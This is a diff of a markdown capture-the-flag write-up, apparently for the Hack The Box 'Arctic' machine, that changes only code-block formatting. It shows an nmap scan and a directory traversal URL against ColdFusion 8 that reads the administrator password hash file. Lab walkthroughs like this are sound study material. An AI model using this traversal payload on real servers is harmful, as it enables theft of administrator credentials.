@@ -9,7 +9,7 @@ so I decided to reorganize my notes, as they were somewhat of a mess and restruc
 ### Initial Enumeration
 
 First, let's start with a quick nmap scan to see what we get.
-```shell
+~~~
 root@kali:~/htb/arctic# nmap -sV 10.10.10.11
 
 Nmap scan report for 10.10.10.11
@@ -20,7 +20,7 @@ PORT      STATE SERVICE VERSION
 8500/tcp  open  http    JRun Web Server
 49154/tcp open  msrpc   Microsoft Windows RPC
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-```
+~~~
 Right off the bat port 8500 looks interesting. Let's have a look in the browser.
 
 ![8500](/img/arctic-8500.png)
@@ -34,9 +34,9 @@ The administrator directory gives us a login for ColdFusion 8.
 ### Exploitation
 
 After a quick search online we find that ColdFusion 8 is vulnerable to directory traversal. ColdFusion 8 also stores the administrator hash locally in a file called password.properties. So we can grab the administrator hash using the directory traversal using the following URL:
-```
-http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
-```
+
+`http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en`
+
 And we get this output in the browser.
 
 ![HASH](/img/arctic-hash.png)
